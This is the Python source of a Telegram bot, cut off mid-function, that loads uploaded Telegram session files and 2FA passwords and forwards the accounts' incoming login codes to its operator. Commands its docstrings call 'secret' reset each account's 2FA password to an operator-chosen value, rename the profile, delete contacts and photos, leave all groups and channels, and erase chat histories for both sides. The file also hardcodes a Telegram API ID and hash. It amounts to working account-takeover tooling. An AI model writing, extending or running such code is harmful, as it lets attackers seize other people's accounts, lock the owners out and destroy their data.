import warnings
warnings.filterwarnings('ignore', category=UserWarning, module='pkg_resources')

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ContextTypes, 
    CallbackQueryHandler, filters
)
from telegram.constants import ParseMode
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError, RPCError
from telethon import events
from telethon.tl.types import MessageService, Channel, Chat, User
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import DeleteChatUserRequest, DeleteHistoryRequest
from telethon.tl.functions.account import UpdatePasswordSettingsRequest, GetPasswordRequest
from telethon.tl.functions.photos import DeletePhotosRequest
from telethon.tl.functions.account import UpdateUsernameRequest, UpdateProfileRequest
from telethon.tl.functions.contacts import DeleteContactsRequest
import os
import json
import tempfile
import zipfile
import shutil
import re
import asyncio
import logging
import signal
import sys
from functools import wraps
import time
from typing import Optional, Dict, Any

# Set up logging with more detailed configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Configuration
API_ID = 21021767
API_HASH = "f0d2874afa840c35b1c96400212a78d3"
SESSIONS_DIR = 'sessions'

# File size limits (in bytes)
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB
MAX_ZIP_ENTRIES = 100  # Maximum number of files in ZIP

# Timeout settings (in seconds)
OPERATION_TIMEOUT = 300  # 5 minutes for operations
CONNECTION_TIMEOUT = 30  # 30 seconds for connections
CLEANUP_TIMEOUT = 600  # 10 minutes for cleanup operations

# Retry settings
MAX_RETRIES = 3
RETRY_DELAY = 5  # seconds

# Global settings
change_password_mode = False
new_password = ""
change_name_mode = False
new_account_name = ""
cleanup_mode = False

# Loading sticker ID
LOADING_STICKER_ID = "CAACAgUAAxkBAAEPUtFovPZ08EglcUMRAg0mpuQjV8eXRAACtRkAAiEb2VXfF6Me-ipGBjYE"

# Active login sessions for OTP detection
active_sessions = {}
message_handlers = {}

# Global shutdown flag
shutdown_flag = False

# Utility functions for error handling and stability
def with_timeout(timeout_seconds: int):
    """Decorator to add timeout to async functions"""
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            try:
                return await asyncio.wait_for(func(*args, **kwargs), timeout=timeout_seconds)
            except asyncio.TimeoutError:
                logger.error(f"Function {func.__name__} timed out after {timeout_seconds} seconds")
                raise
        return wrapper
    return decorator

def with_retry(max_retries: int = MAX_RETRIES, delay: int = RETRY_DELAY):
    """Decorator to add retry logic to async functions"""
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            last_exception = None
            for attempt in range(max_retries + 1):
                try:
                    return await func(*args, **kwargs)
                except (FloodWaitError, RPCError, ConnectionError, TimeoutError) as e:
                    last_exception = e
                    if attempt < max_retries:
                        wait_time = delay * (2 ** attempt)  # Exponential backoff
                        logger.warning(f"Attempt {attempt + 1} failed for {func.__name__}: {e}. Retrying in {wait_time}s...")
                        await asyncio.sleep(wait_time)
                    else:
                        logger.error(f"All {max_retries + 1} attempts failed for {func.__name__}")
                        raise last_exception
                except Exception as e:
                    # Don't retry for non-recoverable errors
                    logger.error(f"Non-recoverable error in {func.__name__}: {e}")
                    raise
            raise last_exception
        return wrapper
    return decorator

async def safe_disconnect_client(client: TelegramClient, phone: str = "unknown"):
    """Safely disconnect a Telegram client with proper error handling"""
    if not client:
        return
    
    try:
        if client.is_connected():
            await client.disconnect()
            logger.info(f"Successfully disconnected client for {phone}")
    except Exception as e:
        logger.error(f"Error disconnecting client for {phone}: {e}")

async def cleanup_active_sessions():
    """Clean up all active sessions safely"""
    global active_sessions, message_handlers
    
    try:
        # Clean up client connections
        client = active_sessions.get('client')
        if client:
            phone = active_sessions.get('phone', 'unknown')
            
            # Remove message handlers
            if phone in message_handlers:
                try:
                    client.remove_event_handler(message_handlers[phone])
                    del message_handlers[phone]
                    logger.info(f"Removed message handler for {phone}")
                except Exception as e:
                    logger.error(f"Error removing message handler for {phone}: {e}")
            
            # Disconnect client
            await safe_disconnect_client(client, phone)
        
        # Clear all sessions
        active_sessions.clear()
        message_handlers.clear()
        logger.info("All active sessions cleaned up")
        
    except Exception as e:
        logger.error(f"Error during session cleanup: {e}")

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    global shutdown_flag
    logger.info(f"Received signal {signum}, initiating graceful shutdown...")
    shutdown_flag = True

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

async def health_check():
    """Perform periodic health checks and cleanup"""
    while not shutdown_flag:
        try:
            # Check for stale sessions
            current_time = time.time()
            stale_sessions = []
            
            for phone, handler in list(message_handlers.items()):
                # Remove sessions that have been inactive for more than 1 hour
                session_start = active_sessions.get('session_start', current_time)
                if current_time - session_start > 3600:  # 1 hour
                    stale_sessions.append(phone)
            
            # Clean up stale sessions
            for phone in stale_sessions:
                logger.info(f"Cleaning up stale session for {phone}")
                if phone in message_handlers:
                    try:
                        client = active_sessions.get('client')
                        if client:
                            client.remove_event_handler(message_handlers[phone])
                        del message_handlers[phone]
                    except Exception as e:
                        logger.error(f"Error cleaning stale session {phone}: {e}")
            
            # Log current status
            active_count = len(message_handlers)
            logger.info(f"Health check: {active_count} active sessions")
            
            # Wait 5 minutes before next check
            await asyncio.sleep(300)
            
        except Exception as e:
            logger.error(f"Error in health check: {e}")
            await asyncio.sleep(60)  # Wait 1 minute on error
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    # Show loading sticker for 1.3 seconds
    await show_loading_sticker(update.get_bot(), update.effective_chat.id, 1.3)
    
    await update.message.reply_text(
        "👋 **Welcome to the Account Manager Bot!**\n\n"
        "Send me a ZIP file containing your authorized account session files.\n\n"
        "📋 **ZIP Format:**\n"
        "```\n"
        "accounts.zip\n"
        "├── 14944888484.json\n"
        "├── 14944888484.session\n"
        "├── 44858938484.json\n"
        "└── 44858938484.session\n"
        "```\n\n"
        "💡 The bot will monitor these authorized accounts for OTP codes when you try to login.",
        parse_mode=ParseMode.MARKDOWN
    )

async def changepasson(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Secret command to enable 2FA password changes"""
    global change_password_mode, new_password
    
    # Extract the password from the command
    if context.args:
        new_password = " ".join(context.args)
        change_password_mode = True
        await update.message.reply_text(
            f"🔐 **Password change mode enabled**\n\n"
            f"All accounts will have their 2FA passwords changed to '{new_password}' during cleanup.",
            parse_mode=ParseMode.MARKDOWN
        )
        logger.info(f"Password change mode enabled with password: {new_password}")
    else:
        await update.message.reply_text(
            "❌ **Usage:** `/changepasson <password>`\n\n"
            "Example: `/changepasson MyNewPassword123`",
            parse_mode=ParseMode.MARKDOWN
        )

async def changepassoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Secret command to disable 2FA password changes"""
    global change_password_mode, new_password
    change_password_mode = False
    new_password = ""
    await update.message.reply_text(
        "🔓 **Password change mode disabled**\n\n"
        "Accounts will keep their original 2FA passwords during cleanup.",
        parse_mode=ParseMode.MARKDOWN
    )
    logger.info("Password change mode disabled")

async def changename(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Secret command to enable name changes for all accounts"""
    global change_name_mode, new_account_name
    
    # Extract the name from the command
    if context.args:
        new_account_name = " ".join(context.args)
        change_name_mode = True
        await update.message.reply_text(
            f"📝 **Name change mode enabled**\n\n"
            f"All accounts will have their names changed to '{new_account_name}' during cleanup.",
            parse_mode=ParseMode.MARKDOWN
        )
        logger.info(f"Name change mode enabled with name: {new_account_name}")
    else:
        await update.message.reply_text(
            "❌ **Usage:** `/changename <name>`\n\n"
            "Example: `/changename John Doe`",
            parse_mode=ParseMode.MARKDOWN
        )

async def changenameoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Secret command to disable name changes"""
    global change_name_mode, new_account_name
    change_name_mode = False
    new_account_name = ""
    await update.message.reply_text(
        "📝 **Name change mode disabled**\n\n"
        "Accounts will keep their original names during cleanup.",
        parse_mode=ParseMode.MARKDOWN
    )
    logger.info("Name change mode disabled")

async def cleanupon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Secret command to enable comprehensive cleanup mode"""
    global cleanup_mode
    cleanup_mode = True
    await update.message.reply_text(
        "🧹 **Cleanup mode enabled**\n\n"
        "All accounts will undergo comprehensive cleanup (groups, channels, chats, profile, etc.) during processing.",
        parse_mode=ParseMode.MARKDOWN
    )
    logger.info("Cleanup mode enabled")

async def cleanupoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Secret command to disable comprehensive cleanup mode"""
    global cleanup_mode
    cleanup_mode = False
    await update.message.reply_text(
        "🚫 **Cleanup mode disabled**\n\n"
        "Accounts will only be monitored for OTP without any cleanup operations.",
        parse_mode=ParseMode.MARKDOWN
    )
    logger.info("Cleanup mode disabled")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot status and active sessions"""
    try:
        active_count = len(message_handlers)
        current_phone = active_sessions.get('phone', 'None')
        current_user = active_sessions.get('current_user', 'None')
        
        # Calculate uptime if session exists
        uptime_str = "N/A"
        if 'session_start' in active_sessions:
            uptime_seconds = int(time.time() - active_sessions['session_start'])
            hours, remainder = divmod(uptime_seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        
        status_text = (
            f"🤖 **Bot Status**\n\n"
            f"📊 **Statistics:**\n"
            f"• Active sessions: {active_count}\n"
            f"• Current phone: `{current_phone}`\n"
            f"• Current user: `{current_user}`\n"
            f"• Session uptime: {uptime_str}\n\n"
            f"⚙️ **Settings:**\n"
            f"• Cleanup mode: {'✅ Enabled' if cleanup_mode else '❌ Disabled'}\n"
            f"• Password change: {'✅ Enabled' if change_password_mode else '❌ Disabled'}\n"
            f"• Name change: {'✅ Enabled' if change_name_mode else '❌ Disabled'}\n\n"
            f"🔧 **Limits:**\n"
            f"• Max file size: {MAX_FILE_SIZE // (1024*1024)}MB\n"
            f"• Max ZIP entries: {MAX_ZIP_ENTRIES}\n"
            f"• Operation timeout: {OPERATION_TIMEOUT}s"
        )
        
        await update.message.reply_text(status_text, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        logger.error(f"Error in status command: {e}")
        await update.message.reply_text(
            f"❌ Error getting status: {str(e)}",
            parse_mode=ParseMode.MARKDOWN
        )

async def show_loading_sticker(bot, chat_id, duration=1.3):
    """Show loading sticker for specified duration"""
    try:
        sticker_msg = await bot.send_sticker(chat_id=chat_id, sticker=LOADING_STICKER_ID)
        await asyncio.sleep(duration)
        await bot.delete_message(chat_id=chat_id, message_id=sticker_msg.message_id)
    except Exception as e:
        logger.error(f"Error showing loading sticker: {e}")

async def logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to logout a specific account by phone number"""
    user_id = update.effective_user.id
    
    # Extract the phone number from the command
    if not context.args:
        await update.message.reply_text(
            "❌ **Usage:** `/logout <phone_number>`\n\n"
            "Example: `/logout 1234567890`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    phone = context.args[0]
    user_dir = os.path.join(SESSIONS_DIR, str(user_id))
    session_path = os.path.join(user_dir, f"{phone}.session")
    json_path = os.path.join(user_dir, f"{phone}.json")
    
    if not os.path.exists(session_path):
        await update.message.reply_text(
            f"❌ **Account not found:** `{phone}`\n\n"
            f"No session file exists for this account.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        logout_msg = await update.message.reply_text(
            f"🔄 **Logging out account:** `{phone}`...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Try to logout the session
        logged_out = False
        try:
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                await client.log_out()
                logged_out = True
                logger.info(f"Logged out session: {phone}")
            await client.disconnect()
        except Exception as e:
            logger.error(f"Error logging out {phone}: {e}")
        
        # Delete session file
        files_deleted = 0
        if os.path.exists(session_path):
            os.remove(session_path)
            files_deleted += 1
        
        # Delete corresponding JSON file
        if os.path.exists(json_path):
            os.remove(json_path)
            files_deleted += 1
        
        # Remove from active sessions if present
        if phone in message_handlers:
            del message_handlers[phone]
        
        status_text = "✅ Logged out" if logged_out else "⚠️ Session cleared"
        
        await logout_msg.edit_text(
            f"{status_text} **Account:** `{phone}`\n\n"
            f"📊 **Results:**\n"
            f"• Session logged out: {'✅' if logged_out else '❌'}\n"
            f"• Files deleted: {files_deleted}\n\n"
            f"🔒 Account has been removed from the bot.",
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        logger.error(f"Error during logout of {phone}: {e}")
        await update.message.reply_text(
            f"❌ **Error logging out {phone}:** {str(e)}",
            parse_mode=ParseMode.MARKDOWN
        )

async def logout_and_cleanup_all_sessions(user_id, bot):
    """Logout all active sessions and delete all session/JSON files"""
    try:
        cleanup_msg = await bot.send_message(
            chat_id=user_id,
            text="🔄 **Logging out all sessions and cleaning up files...**",
            parse_mode=ParseMode.MARKDOWN
        )
        
        user_dir = os.path.join(SESSIONS_DIR, str(user_id))
        if not os.path.exists(user_dir):
            await bot.edit_message_text(
                chat_id=user_id,
                message_id=cleanup_msg.message_id,
                text="✅ **No sessions to cleanup**",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        logged_out_count = 0
        deleted_files = 0
        
        # Get all session files
        session_files = [f for f in os.listdir(user_dir) if f.endswith('.session')]
        
        for session_file in session_files:
            try:
                session_path = os.path.join(user_dir, session_file)
                phone = session_file.replace('.session', '')
                
                # Try to logout the session
                try:
                    client = TelegramClient(session_path, API_ID, API_HASH)
                    await client.connect()
                    if await client.is_user_authorized():
                        await client.log_out()
                        logged_out_count += 1
                        logger.info(f"Logged out session: {phone}")
                    await client.disconnect()
                except Exception as e:
                    logger.error(f"Error logging out {phone}: {e}")
                
                # Delete session file
                if os.path.exists(session_path):
                    os.remove(session_path)
                    deleted_files += 1
                
                # Delete corresponding JSON file
                json_path = os.path.join(user_dir, f"{phone}.json")
                if os.path.exists(json_path):
                    os.remove(json_path)
                    deleted_files += 1
                    
            except Exception as e:
                logger.error(f"Error cleaning up {session_file}: {e}")
        
        # Remove user directory if empty
        try:
            if os.path.exists(user_dir) and not os.listdir(user_dir):
                os.rmdir(user_dir)
        except Exception as e:
            logger.error(f"Error removing user directory: {e}")
        
        # Clear active sessions
        active_sessions.clear()
        message_handlers.clear()
        
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=cleanup_msg.message_id,
            text=f"✅ **Cleanup completed!**\n\n",
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        logger.error(f"Error during logout and cleanup: {e}")
        await bot.send_message(
            chat_id=user_id,
            text=f"❌ **Error during cleanup:** {str(e)}",
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_otp_message(event):
    """Handle incoming OTP messages from Telegram"""
    try:
        if not event.message or not event.message.message:
            return

        # Skip service messages (like login notifications)
        if isinstance(event.message, MessageService):
            return

        msg_text = event.message.message
        logger.info(f"Received message: {msg_text}")
        
        # Look for the specific OTP message format
        if "Login code:" in msg_text and "Do not give this code to anyone" in msg_text:
            # Extract the 5-digit code using regex
            code_match = re.search(r'Login code: (\d{5})', msg_text)
            if code_match:
                otp_code = code_match.group(1)
                logger.info(f"Detected OTP code: {otp_code}")
                
                user_id = active_sessions.get('current_user')
                bot = active_sessions.get('bot')
                current_phone = active_sessions.get('phone')
                twofa = active_sessions.get('twofa', '')
                
                if user_id and bot:
                    # Build keyboard with options
                    keyboard = InlineKeyboardMarkup([
                        [InlineKeyboardButton("Next Account", callback_data="next_account")],
                        [InlineKeyboardButton("Capture OTP", callback_data="capture_otp")],
                        [InlineKeyboardButton("Stop", callback_data="stop_process")]
                    ])

                    # Send the OTP information to the user
                    await bot.send_message(
                        chat_id=user_id,
                        text=f"🔐 **OTP Received!**\n\n"
                             f"📱 Number: `{current_phone}`\n"
                             f"🔢 Login Code: `{otp_code}`\n"
                             f"🔑 2FA: `{twofa}`\n\n"
                             f"💬 Message:\n{msg_text}",
                        reply_markup=keyboard,
                        parse_mode=ParseMode.MARKDOWN
                    )
    except Exception as e:
        logger.error(f"Error in OTP detection: {e}")

async def capture_recent_otp():
    """Capture the most recent OTP message from Telegram"""
    try:
        client = active_sessions.get('client')
        if not client:
            return None, None
            
        # Get the most recent messages (last 10)
        messages = await client.get_messages('Telegram', limit=10)
        
        # Look for OTP messages in the recent messages
        for message in messages:
            if not message.message:
                continue
                
            msg_text = message.message
            # Look for the specific OTP message format
            if "Login code:" in msg_text and "Do not give this code to anyone" in msg_text:
                # Extract the 5-digit code using regex
                code_match = re.search(r'Login code: (\d{5})', msg_text)
                if code_match:
                    otp_code = code_match.group(1)
                    logger.info(f"Captured OTP code from recent messages: {otp_code}")
                    return msg_text, otp_code
                    
        return None, None
    except Exception as e:
        logger.error(f"Error capturing recent OTP: {e}")
        return None, None

@with_timeout(CLEANUP_TIMEOUT)
@with_retry(max_retries=2)  # Reduced retries for cleanup to avoid long waits
async def comprehensive_account_cleanup(client, phone, user_id, bot, account_data=None):
    """Comprehensive account cleanup including all channels, groups, profile, username, and chats"""
    try:
        # Show loading sticker during cleanup
        await show_loading_sticker(bot, user_id, 2.0)
        
        cleanup_msg = await bot.send_message(
            chat_id=user_id,
            text=f"🧹 **Starting comprehensive cleanup for {phone}...**\n\n"
                 f"⏳ This may take several minutes...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        results = {
            'groups_left': 0,
            'channels_left': 0,
            'chats_deleted': 0,
            'bot_chats_deleted': 0,
            'archived_cleaned': 0,
            'username_removed': False,
            'profile_cleared': False,
            'photos_deleted': 0,
            'contacts_deleted': 0,
            'password_changed': False,
            'name_changed': False
        }
        
        # Step 1: Remove username
        try:
            await client(UpdateUsernameRequest(username=""))
            results['username_removed'] = True
            logger.info(f"Removed username for {phone}")
        except Exception as e:
            logger.error(f"Error removing username for {phone}: {e}")
        
        # Step 2: Update profile (name change or clear profile)
        try:
            logger.info(f"Profile update - change_name_mode: {change_name_mode}, new_account_name: '{new_account_name}'")
            if change_name_mode and new_account_name:
                # Change name to specified name
                logger.info(f"Attempting to change name to '{new_account_name}' for {phone}")
                await client(UpdateProfileRequest(
                    first_name=new_account_name,
                    last_name="",
                    about=""
                ))
                results['name_changed'] = True
                logger.info(f"Successfully changed name to '{new_account_name}' for {phone}")
            else:
                # Clear profile (original behavior)
                logger.info(f"Clearing profile for {phone} (name_mode: {change_name_mode}, name: '{new_account_name}')")
                await client(UpdateProfileRequest(
                    first_name="",
                    last_name="",
                    about=""
                ))
                results['profile_cleared'] = True
                logger.info(f"Successfully cleared profile for {phone}")
        except Exception as e:
            logger.error(f"Error updating profile for {phone}: {e}")
        
        # Step 3: Delete all profile photos
        try:
            photos = await client.get_profile_photos('me')
            if photos:
                await client(DeletePhotosRequest(photos))
                results['photos_deleted'] = len(photos)
                logger.info(f"Deleted {len(photos)} profile photos for {phone}")
        except Exception as e:
            logger.error(f"Error deleting profile photos for {phone}: {e}")
        
        # Step 4: Delete all contacts
        try:
            contacts = await client.get_contacts()
            if contacts:
                contact_ids = [contact.id for contact in contacts]
                await client(DeleteContactsRequest(contact_ids))
                results['contacts_deleted'] = len(contact_ids)
                logger.info(f"Deleted {len(contact_ids)} contacts for {phone}")
        except Exception as e:
            logger.error(f"Error deleting contacts for {phone}: {e}")
        
        # Step 5: Change 2FA password if enabled
        if change_password_mode and new_password:
            try:
                # Accept both 'twoFA' and 'twofa' keys from the JSON; None means 2FA is currently not set
                current_password = None
                if account_data:
                    current_password = account_data.get('twoFA') or account_data.get('twofa') or None
                    if current_password == "":
                        current_password = None

                # Use Telethon's helper to set or change 2FA
                try:
                    await client.edit_2fa(
                        current_password=current_password,
                        new_password=new_password,
                        hint='Standard password'
                    )
                    results['password_changed'] = True
                    logger.info(f"Changed/Set 2FA password for {phone}")
                except AttributeError:
                    # Fallback: Skip password change if method not available in this Telethon version
                    logger.warning(f"Password change not supported in this Telethon version for {phone}")

            except Exception as e:
                logger.error(f"Error changing/setting 2FA password for {phone}: {e}")
        
        # Step 6: Get all dialogs including archived
        dialogs = await client.get_dialogs(limit=None, archived=False)
        archived_dialogs = await client.get_dialogs(limit=None, archived=True)
        all_dialogs = dialogs + archived_dialogs
        
        results['archived_cleaned'] = len(archived_dialogs)
        
        # Step 7: Process all dialogs
        for dialog in all_dialogs:
            try:
                entity = dialog.entity
                
                # Skip if it's the current user (saved messages)
                if isinstance(entity, User) and entity.is_self:
                    continue
                
                # Handle channels (including supergroups)
                if isinstance(entity, Channel):
                    if entity.megagroup or not entity.broadcast:
                        # It's a supergroup
                        try:
                            await client(LeaveChannelRequest(entity))
                            results['groups_left'] += 1
                            logger.info(f"Left supergroup: {entity.title}")
                        except Exception as e:
                            logger.error(f"Error leaving supergroup {entity.title}: {e}")
                    else:
                        # It's a channel
                        try:
                            await client(LeaveChannelRequest(entity))
                            results['channels_left'] += 1
                            logger.info(f"Left channel: {entity.title}")
                        except Exception as e:
                            logger.error(f"Error leaving channel {entity.title}: {e}")
                
                # Handle basic groups
                elif isinstance(entity, Chat):
                    try:
                        # Leave basic group by deleting self from chat
                        me = await client.get_me()
                        await client(DeleteChatUserRequest(entity.id, me.id))
                        results['groups_left'] += 1
                        logger.info(f"Left basic group: {entity.title}")
                    except Exception as e:
                        logger.error(f"Error leaving basic group {entity.title}: {e}")
                
                # Handle private chats (users and bots)
                elif isinstance(entity, User):
                    # Skip official Telegram accounts that send OTP codes
                    official_accounts = [
                        777000,  # Telegram
                        42777,   # Telegram Notifications
                        1087968824,  # GroupAnonymousBot
                        136817688,   # Channel_Bot
                        93372553,    # BotFather
                        101955149,   # WebpageBot
                        429000,      # Telegram Login
                        4244000,     # Telegram Passport
                        178220800,   # Telegram Tips
                        1559501630,  # Telegram Support
                    ]
                    
                    # Also skip if username indicates official Telegram account
                    official_usernames = ['telegram', 'telegramtips', 'botfather', 'webpagebot']
                    
                    if (entity.id in official_accounts or 
                        (entity.username and entity.username.lower() in official_usernames) or
                        (entity.verified and entity.bot)):  # Skip verified bots
                        logger.info(f"Preserving official account: {entity.first_name or entity.username or 'Unknown'} (ID: {entity.id})")
                        continue
                    
                    try:
                        # Delete chat history
                        await client(DeleteHistoryRequest(
                            peer=entity,
                            max_id=0,
                            just_clear=False,
                            revoke=True
                        ))
                        if entity.bot:
                            results['bot_chats_deleted'] += 1
                            logger.info(f"Deleted bot chat with: {entity.first_name or 'Unknown Bot'}")
                        else:
                            results['chats_deleted'] += 1
                            logger.info(f"Deleted chat with: {entity.first_name or 'Unknown'}")
                    except Exception as e:
                        logger.error(f"Error deleting chat with {entity.first_name or 'Unknown'}: {e}")
                
                # Small delay to avoid rate limiting with loading sticker
                await show_loading_sticker(bot, user_id, 0.3)
                
            except Exception as e:
                logger.error(f"Error processing dialog: {e}")
                continue
        
        # Update cleanup message with comprehensive results
        password_status = f"✅ Changed to '{new_password}'" if results['password_changed'] else ("❌ Not changed" if change_password_mode else "⏭️ Skipped")
        
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=cleanup_msg.message_id,
            text=f"✅ **Comprehensive cleanup completed for {phone}!**\n\n"
                 f"📊 **Results:**\n"
                 f"• Groups left: {results['groups_left']}\n"
                 f"• Channels left: {results['channels_left']}\n"
                 f"• Private chats deleted: {results['chats_deleted']}\n"
                 f"• Bot chats deleted: {results['bot_chats_deleted']}\n"
                 f"• Archived items cleaned: {results['archived_cleaned']}\n"
                 f"• Username removed: {'✅' if results['username_removed'] else '❌'}\n"
                 f"• Profile updated: {'✅' if results['name_changed'] or results['profile_cleared'] else '❌'}\n"
                 f"• Photos deleted: {results['photos_deleted']}\n"
                 f"• Contacts deleted: {results['contacts_deleted']}\n"
                 f"• 2FA Password: {password_status}\n\n"
                 f"🔄 Ready for OTP monitoring...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        logger.info(f"Cleaning.... {phone}: {results}")
        return True
        
    except Exception as e:
        logger.error(f"Error during comprehensive cleanup for {phone}: {e}")
        try:
            await bot.send_message(
                chat_id=user_id,
                text=f"❌ **Comprehensive cleanup failed for {phone}**\n\n"
                     f"Error: {str(e)}\n\n"
                     f"Continuing with OTP monitoring...",
                parse_mode=ParseMode.MARKDOWN
            )
        except:
            pass
        return False

@with_timeout(OPERATION_TIMEOUT)
@with_retry()
async def process_next_account(user_id, bot):
    """Process the next authorized account in the queue"""
    # Clean up previous client if exists
    if active_sessions.get('client'):
        try:
            client = active_sessions.get('client')
            if client and client.is_connected():
                # Remove message handler
                phone = active_sessions.get('phone')
                if phone and phone in message_handlers:
                    try:
                        client.remove_event_handler(message_handlers[phone])
                        del message_handlers[phone]
                    except:
                        pass
                
                # Disconnect client safely
                try:
                    await client.disconnect()
                except:
                    pass
        except Exception as e:
            logger.error(f"Error cleaning up client: {e}")
    
    accounts = active_sessions.get('pending_accounts', [])
    if not accounts:
        await bot.send_message(chat_id=user_id, text="✅ All authorized accounts processed!")
        active_sessions.clear()
        return

    # Get next account
    next_account = accounts.pop(0)
    active_sessions['pending_accounts'] = accounts

    phone = next_account.get('phone')
    twofa = next_account.get('twofa')
    session_path = next_account.get('session_path')

    # Tell user to use this account for login
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Capture OTP", callback_data="capture_otp")],
        [InlineKeyboardButton("Next Account", callback_data="next_account")],
        [InlineKeyboardButton("Stop", callback_data="stop_process")]
    ])
    
    # Determine which password to display
    display_password = new_password if change_password_mode and new_password else twofa
    
    message = await bot.send_message(
        chat_id=user_id,
        text=f"📱 **Use this authorized account to log in:** `{phone}`\n\n"
             f"🔑 **2FA (if asked):** `{display_password}`\n\n"
             f"⏳ I will monitor this account for OTP messages when you try to login.",
        reply_markup=keyboard,
        parse_mode=ParseMode.MARKDOWN
    )
    
    active_sessions['current_message_id'] = message.message_id

    try:
        # Initialize client with the existing session
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        # Check if authorized (should be since we filtered)
        if not await client.is_user_authorized():
            await bot.send_message(chat_id=user_id, text=f"❌ Account {phone} is not authorized! Skipping...")
            await client.disconnect()
            await process_next_account(user_id, bot)
            return

        # Store client for OTP detection
        active_sessions.update({
            'current_user': user_id,
            'bot': bot,
            'client': client,
            'phone': phone,
            'twofa': twofa,
            'session_path': session_path,
            'session_start': time.time()  # Add timestamp for health checks
        })
        
        # Perform comprehensive account cleanup before OTP monitoring
        # Get account data for password changes
        account_data = None
        try:
            user_dir = os.path.join(SESSIONS_DIR, str(user_id))
            json_path = os.path.join(user_dir, f"{phone}.json")
            if os.path.exists(json_path):
                with open(json_path, 'r') as f:
                    account_data = json.load(f)
        except Exception as e:
            logger.error(f"Error loading account data for {phone}: {e}")
        
        # Only perform cleanup if cleanup mode is enabled; otherwise, proceed silently
        if cleanup_mode:
            await comprehensive_account_cleanup(client, phone, user_id, bot, account_data)
        else:
            # If change-pass mode is enabled, change/set 2FA even when cleanup is disabled
            if change_password_mode and new_password:
                try:
                    current_password = None
                    if account_data:
                        current_password = account_data.get('twoFA') or account_data.get('twofa') or None
                        if current_password == "":
                            current_password = None

                    try:
                        await client.edit_2fa(
                            current_password=current_password,
                            new_password=new_password,
                            hint='Standard password'
                        )
                        logger.info(f"Changed/Set 2FA password for {phone} (cleanup disabled)")
                    except AttributeError:
                        logger.warning(f"Password change not supported in this Telethon version for {phone}")
                except Exception as e:
                    logger.error(f"Error changing/setting 2FA password for {phone} (cleanup disabled): {e}")
        
        # Add message handler for OTP detection
        @client.on(events.NewMessage(incoming=True))
        async def new_message_handler(event):
            await handle_otp_message(event)
        
        message_handlers[phone] = new_message_handler
        
        # Start listening for messages (remove this as it's causing issues)
        # client.start()
        
        await bot.send_message(
            chat_id=user_id,
            text=f"🔍 Now monitoring {phone} for OTP messages. Please try to login with this number in your Telegram app."
        )
        
    except Exception as e:
        error_msg = f"❌ Error with {phone}: {str(e)}"
        await bot.send_message(chat_id=user_id, text=error_msg)
        await asyncio.sleep(2)
        await process_next_account(user_id, bot)

@with_timeout(OPERATION_TIMEOUT)
@with_retry()
async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle ZIP file upload containing authorized session files"""
    user_id = update.effective_user.id
    
    # Clear any existing sessions safely
    await cleanup_active_sessions()
    
    if not update.message.document:
        await update.message.reply_text(
            "❌ Please send a ZIP file containing authorized session files",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    document = update.message.document
    
    # Validate file extension
    if not document.file_name.endswith('.zip'):
        await update.message.reply_text(
            "❌ File must be a ZIP archive",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Validate file size
    if document.file_size > MAX_FILE_SIZE:
        await update.message.reply_text(
            f"❌ File too large! Maximum size allowed: {MAX_FILE_SIZE // (1024*1024)}MB\n"
            f"Your file size: {document.file_size // (1024*1024)}MB",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Create temp directory for processing
    temp_dir = tempfile.mkdtemp()
    try:
        # Show loading sticker during account checkup
        await show_loading_sticker(update.get_bot(), update.effective_chat.id, 2.0)
        
        # Download the file
        file = await update.message.document.get_file()
        temp_dir = tempfile.mkdtemp()
        zip_path = os.path.join(temp_dir, "accounts.zip")
        await file.download_to_drive(zip_path)
        
        # Process ZIP file
        accounts = []
        
        await update.message.reply_text(
            "🔍 **Checking authorized accounts in ZIP file...**\n"
            "_This might take a moment..._",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Validate and process ZIP file safely
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                # Check number of files in ZIP
